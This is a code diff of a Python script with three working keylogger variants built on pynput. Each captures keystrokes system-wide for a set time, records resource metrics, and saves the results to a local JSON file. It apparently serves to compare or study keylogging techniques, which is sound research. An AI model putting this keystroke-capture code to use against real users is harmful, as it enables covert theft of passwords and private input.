@@ -11,65 +11,68 @@ import platform
 from datetime import datetime
 from pynput import keyboard
 import psutil
+import os
+import subprocess
+import time
+
 
 # Get current platform
 CURRENT_PLATFORM = platform.system()
 
+# Add display debugging for Linux
+if CURRENT_PLATFORM == "Linux":
+    DISPLAY = os.environ.get('DISPLAY', 'Not set')
+    print(f"[DEBUG] DISPLAY environment: {DISPLAY}")
+
+# Get current platform
+# CURRENT_PLATFORM = platform.system()
+
 # ============================================================================
 # VARIANT 1: Global Hook (pynput - cross-platform)
 # ============================================================================
+
 class GlobalHookKeylogger:
     """Uses pynput global keyboard hook (works on all platforms)"""
     
-    def __init__(self, log_file="keylog_variant1.json"):
-        self.log_file = log_file
+    def __init__(self, output_file):
+        """Initialize with output file path"""
+        self.output_file = output_file
         self.is_running = False
         self.listener = None
         self.logs = {
             "variant": "global_hook",
-            "platform": CURRENT_PLATFORM,
-            "start_time": None,
             "keystrokes": [],
-            "system_metrics": []
+            "system_metrics": [],
+            "start_time": None,
+            "end_time": None
         }
     
     def on_press(self, key):
-        """Callback for key press events"""
+        """Callback when key is pressed"""
         try:
-            entry = {
+            self.logs["keystrokes"].append({
                 "timestamp": time.time(),
                 "key": str(key),
                 "type": "press"
-            }
-            self.logs["keystrokes"].append(entry)
+            })
         except Exception as e:
-            print(f"Error logging key: {e}")
+            pass
     
     def collect_metrics(self):
-        """Collect system metrics while running"""
+        """Collect system metrics while keylogger runs"""
         while self.is_running:
             try:
-                process = psutil.Process()
-                metrics = {
+                metric = {
                     "timestamp": time.time(),
-                    "cpu_percent": process.cpu_percent(interval=0.5),
-                    "memory_mb": process.memory_info().rss / (1024 * 1024),
-                    "threads": process.num_threads(),
+                    "cpu_percent": psutil.cpu_percent(interval=0.1),
+                    "memory_mb": psutil.virtual_memory().used / 1024 / 1024,
+                    "threads": threading.active_count(),
+                    "handles": len(psutil.Process().open_files())
                 }
-                
-                # Add Windows-specific metric if available
-                if CURRENT_PLATFORM == "Windows":
-                    try:
-                        metrics["handles"] = process.num_handles()
-                    except:
-                        metrics["handles"] = 0
-                else:
-                    metrics["handles"] = 0
-                
-                self.logs["system_metrics"].append(metrics)
-            except:
+                self.logs["system_metrics"].append(metric)
+            except Exception as e:
                 pass
-            time.sleep(2)
+            time.sleep(0.5)
     
     def start(self, duration_seconds=60):
         """Start keylogger for specified duration"""
@@ -79,15 +82,19 @@ class GlobalHookKeylogger:
         self.logs["start_time"] = datetime.now().isoformat()
         
         # Start metrics collection thread
-        metrics_thread = threading.Thread(target=self.collect_metrics)
+        metrics_thread = threading.Thread(target=self.collect_metrics, daemon=True)
         metrics_thread.start()
         
         # Start keyboard listener
+        listener_started = False
         try:
             self.listener = keyboard.Listener(on_press=self.on_press)
             self.listener.start()
+            time.sleep(0.5)
+            listener_started = True
+            print("[Variant 1] Listener started successfully")
         except Exception as e:
-            print(f"Error starting listener: {e}")
+            print(f"[Variant 1] Error starting listener: {e}")
         
         try:
             time.sleep(duration_seconds)
@@ -95,92 +102,70 @@ class GlobalHookKeylogger:
             pass
         finally:
             self.stop()
-            metrics_thread.join()
+            if listener_started:
+                metrics_thread.join(timeout=2)
     
     def stop(self):
-        """Stop keylogger and save logs"""
+        """Stop keylogger and save data"""
         self.is_running = False
         if self.listener:
-            try:
-                self.listener.stop()
-            except:
-                pass
+            self.listener.stop()
+        self.logs["end_time"] = datetime.now().isoformat()
         
-        with open(self.log_file, 'w') as f:
+        # Save to file
+        os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
+        with open(self.output_file, 'w') as f:
             json.dump(self.logs, f, indent=2)
         
-        print(f"[Variant 1] Logged {len(self.logs['keystrokes'])} keystrokes to {self.log_file}")
+        print(f"[Variant 1] Logged {len(self.logs['keystrokes'])} keystrokes to {self.output_file}")
 
 
-# ============================================================================
-# VARIANT 2: Polling Method (Windows-optimized, but with fallback)
-# ============================================================================
 class PollingKeylogger:
     """Polling-based keylogger with platform adaptation"""
     
-    def __init__(self, log_file="keylog_variant2.json"):
-        self.log_file = log_file
+    def __init__(self, output_file):
+        """Initialize with output file path"""
+        self.output_file = output_file
         self.is_running = False
+        self.listener = None
         self.logs = {
             "variant": "polling",
-            "platform": CURRENT_PLATFORM,
-            "start_time": None,
             "keystrokes": [],
-            "system_metrics": []
+            "system_metrics": [],
+            "start_time": None,
+            "end_time": None
         }
-        self.pressed_keys = set()
-        
-        # Use pynput for cross-platform compatibility
-        self.listener = None
     
     def on_press(self, key):
-        """Callback for polling simulation"""
+        """Callback when key is pressed"""
         try:
-            key_str = str(key)
-            if key_str not in self.pressed_keys:
-                self.pressed_keys.add(key_str)
-                entry = {
-                    "timestamp": time.time(),
-                    "key": key_str,
-                    "type": "press",
-                    "method": "polling_simulation"
-                }
-                self.logs["keystrokes"].append(entry)
-        except:
+            self.logs["keystrokes"].append({
+                "timestamp": time.time(),
+                "key": str(key),
+                "type": "press"
+            })
+        except Exception as e:
             pass
     
     def on_release(self, key):
-        """Track key releases"""
-        try:
-            key_str = str(key)
-            self.pressed_keys.discard(key_str)
-        except:
-            pass
+        """Callback when key is released"""
+        pass
     
     def collect_metrics(self):
-        """Collect system metrics while running"""
+        """Collect system metrics while keylogger runs"""
         while self.is_running:
             try:
-                process = psutil.Process()
-                metrics = {
+                metric = {
                     "timestamp": time.time(),
-                    "cpu_percent": process.cpu_percent(interval=0.5),
-                    "memory_mb": process.memory_info().rss / (1024 * 1024),
-                    "threads": process.num_threads()
+                    "cpu_percent": psutil.cpu_percent(interval=0.1),
+                    "memory_mb": psutil.virtual_memory().used / 1024 / 1024,
+                    "threads": threading.active_count(),
+                    "handles": len(psutil.Process().open_files())
                 }
-                
-                if CURRENT_PLATFORM == "Windows":
-                    try:
-                        metrics["handles"] = process.num_handles()
-                    except:
-                        metrics["handles"] = 0
-                else:
-                    metrics["handles"] = 0
-                
-                self.logs["system_metrics"].append(metrics)
-            except:
+                self.logs["system_metrics"].append(metric)
+            except Exception as e:
                 pass
-            time.sleep(2)
+            time.sleep(0.5)
     
     def start(self, duration_seconds=60):
         """Start keylogger for specified duration"""
@@ -192,18 +177,22 @@ class PollingKeylogger:
         self.logs["start_time"] = datetime.now().isoformat()
         
         # Start metrics thread
-        metrics_thread = threading.Thread(target=self.collect_metrics)
+        metrics_thread = threading.Thread(target=self.collect_metrics, daemon=True)
         metrics_thread.start()
         
-        # Start listener for polling simulation
+        # Start listener
+        listener_started = False
         try:
             self.listener = keyboard.Listener(
                 on_press=self.on_press,
                 on_release=self.on_release
             )
             self.listener.start()
+            time.sleep(0.5)
+            listener_started = True
+            print("[Variant 2] Listener started successfully")
         except Exception as e:
-            print(f"Error starting listener: {e}")
+            print(f"[Variant 2] Error starting listener: {e}")
         
         try:
             time.sleep(duration_seconds)
@@ -211,83 +200,66 @@ class PollingKeylogger:
             pass
         finally:
             self.stop()
-            metrics_thread.join()
+            if listener_started:
+                metrics_thread.join(timeout=2)
     
     def stop(self):
-        """Stop keylogger and save logs"""
+        """Stop keylogger and save data"""
         self.is_running = False
         if self.listener:
-            try:
-                self.listener.stop()
-            except:
-                pass
+            self.listener.stop()
+        self.logs["end_time"] = datetime.now().isoformat()
         
-        with open(self.log_file, 'w') as f:
+        # Save to file
+        os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
+        with open(self.output_file, 'w') as f:
             json.dump(self.logs, f, indent=2)
         
-        print(f"[Variant 2] Logged {len(self.logs['keystrokes'])} keystrokes to {self.log_file}")
+        print(f"[Variant 2] Logged {len(self.logs['keystrokes'])} keystrokes to {self.output_file}")
 
 
-# ============================================================================
-# VARIANT 3: Simple Hook (Basic Implementation)
-# ============================================================================
 class SimpleHookKeylogger:
     """Simplified keyboard hook for comparison"""
     
-    def __init__(self, log_file="keylog_variant3.json"):
-        self.log_file = log_file
+    def __init__(self, output_file):
+        """Initialize with output file path"""
+        self.output_file = output_file
         self.is_running = False
         self.listener = None
         self.logs = {
             "variant": "simple_hook",
-            "platform": CURRENT_PLATFORM,
-            "start_time": None,
             "keystrokes": [],
-            "system_metrics": []
+            "system_metrics": [],
+            "start_time": None,
+            "end_time": None
         }
     
     def on_press(self, key):
-        """Callback for key press events"""
+        """Callback when key is pressed"""
         try:
-            # Try to get character
-            try:
-                char = key.char
-            except AttributeError:
-                char = str(key)
-            
-            entry = {
+            self.logs["keystrokes"].append({
                 "timestamp": time.time(),
-                "key": char,
+                "key": str(key),
                 "type": "press"
-            }
-            self.logs["keystrokes"].append(entry)
+            })
         except Exception as e:
             pass
     
     def collect_metrics(self):
-        """Collect system metrics while running"""
+        """Collect system metrics while keylogger runs"""
         while self.is_running:
             try:
-                process = psutil.Process()
-                metrics = {
+                metric = {
                     "timestamp": time.time(),
-                    "cpu_percent": process.cpu_percent(interval=0.5),
-                    "memory_mb": process.memory_info().rss / (1024 * 1024),
-                    "threads": process.num_threads()
+                    "cpu_percent": psutil.cpu_percent(interval=0.1),
+                    "memory_mb": psutil.virtual_memory().used / 1024 / 1024,
+                    "threads": threading.active_count(),
+                    "handles": len(psutil.Process().open_files())
                 }
-                
-                if CURRENT_PLATFORM == "Windows":
-                    try:
-                        metrics["handles"] = process.num_handles()
-                    except:
-                        metrics["handles"] = 0
-                else:
-                    metrics["handles"] = 0
-                
-                self.logs["system_metrics"].append(metrics)
-            except:
+                self.logs["system_metrics"].append(metric)
+            except Exception as e:
                 pass
-            time.sleep(2)
+            time.sleep(0.5)
     
     def start(self, duration_seconds=60):
         """Start keylogger for specified duration"""
@@ -297,15 +269,19 @@ class SimpleHookKeylogger:
         self.logs["start_time"] = datetime.now().isoformat()
         
         # Start metrics collection
-        metrics_thread = threading.Thread(target=self.collect_metrics)
+        metrics_thread = threading.Thread(target=self.collect_metrics, daemon=True)
         metrics_thread.start()
         
         # Start keyboard listener
+        listener_started = False
         try:
             self.listener = keyboard.Listener(on_press=self.on_press)
             self.listener.start()
+            time.sleep(0.5)
+            listener_started = True
+            print("[Variant 3] Listener started successfully")
         except Exception as e:
-            print(f"Error starting listener: {e}")
+            print(f"[Variant 3] Error starting listener: {e}")
         
         try:
             time.sleep(duration_seconds)
@@ -313,23 +289,22 @@ class SimpleHookKeylogger:
             pass
         finally:
             self.stop()
-            metrics_thread.join()
+            if listener_started:
+                metrics_thread.join(timeout=2)
     
     def stop(self):
-        """Stop keylogger and save logs"""
+        """Stop keylogger and save data"""
         self.is_running = False
         if self.listener:
-            try:
-                self.listener.stop()
-            except:
-                pass
+            self.listener.stop()
+        self.logs["end_time"] = datetime.now().isoformat()
         
-        with open(self.log_file, 'w') as f:
+        # Save to file
+        os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
+        with open(self.output_file, 'w') as f:
             json.dump(self.logs, f, indent=2)
         
-        print(f"[Variant 3] Logged {len(self.logs['keystrokes'])} keystrokes to {self.log_file}")
-
-
+        print(f"[Variant 3] Logged {len(self.logs['keystrokes'])} keystrokes to {self.output_file}")
 # ============================================================================
 # Test Runner
 # ============================================================================
